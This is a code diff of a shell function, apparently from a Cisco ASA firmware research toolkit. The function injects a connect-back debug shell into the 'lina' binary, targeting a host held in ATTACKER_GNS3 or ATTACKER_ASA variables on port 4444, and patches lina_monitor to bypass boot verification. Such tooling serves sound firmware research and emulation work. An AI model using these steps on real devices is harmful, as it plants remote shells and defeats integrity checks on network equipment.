@@ -572,8 +572,8 @@ replace_lina_monitor()
 ##
 inject_debugshell()
 {
-    # Patching in a debugshell to lina has the implicit requirement of patching
-    # lina_monitor to bypass boot verification of lina. If you 
+    # On ASAv 64-bit, patching in a debugshell to lina has the implicit requirement 
+    # of patching lina_monitor to bypass boot verification of lina.
     if [[ "$DEBUGSHELL" == "YES" ]]
     then
         ADDITIONAL_ARGS=""
@@ -584,35 +584,19 @@ inject_debugshell()
         CBPORT="4444"
         if [[ "$FWFILE" == *"asav"* ]]
         then
-            log "Using 64-bit firmware"
+            log "debug shell: using 64-bit ASAv firmware"
             CBHOST=${ATTACKER_GNS3}
-            log "Patching lina_monitor"
-            if [[ "$FWFILE" == *"asav962-7"* ]]
-            then
-                cp ${FIRMWAREDIR}/_asav962-7/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
-            elif [[ "$FWFILE" == *"asav941-200"* ]]
-            then
-                cp ${FIRMWAREDIR}/_asav941-200/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
-            elif [[ "$FWFILE" == *"asav981-5"* ]]
-            then
-                cp ${FIRMWAREDIR}/_asav981-5/lina_monitor_patched $(pwd)/asa/bin/lina_monitor
-            else
-                # XXX - How different are the lina_montor_patched above? Could
-                # we just include one in our repo and patch it into any firmware?
-                log "ERROR: You need to add lina_monitor support for this firmware version"
-                exit 1
-            fi
         else
-            log "Using 32-bit firmware"
+            log "debug shell: using 32-bit / 64-bit firmware for real hardware"
             CBHOST=${ATTACKER_ASA}
         fi
         log "Adding debug shell for $CBHOST:$CBPORT"
-        log "Using command: ${LINA_LINUXSHELL} -b "$FWFILE" -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" ${ADDITIONAL_ARGS}"
+        log "Using command: ${LINA_LINUXSHELL} -b "$FWFILE" -F $(pwd)/asa/bin/lina_monitor -O $(pwd)/asa/bin/lina_monitor -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" ${ADDITIONAL_ARGS}"
         # XXX - fix fact that we use -b to specify the bin_name but it would not work if the name is not one of the original Cisco ones (such as asa924-k8.bin)
-        ${LINA_LINUXSHELL} -b "$FWFILE" -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" ${ADDITIONAL_ARGS}
+        ${LINA_LINUXSHELL} -b "$FWFILE" -F $(pwd)/asa/bin/lina_monitor -O $(pwd)/asa/bin/lina_monitor -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" ${ADDITIONAL_ARGS}
         if [ $? != 0 ];
         then
-            echo "${LINA_LINUXSHELL} -b "$FWFILE" -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" failed"
+            echo "${LINA_LINUXSHELL} -b "$FWFILE" -F $(pwd)/asa/bin/lina_monitor -O $(pwd)/asa/bin/lina_monitor -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" failed"
             exit 1
         fi
     fi
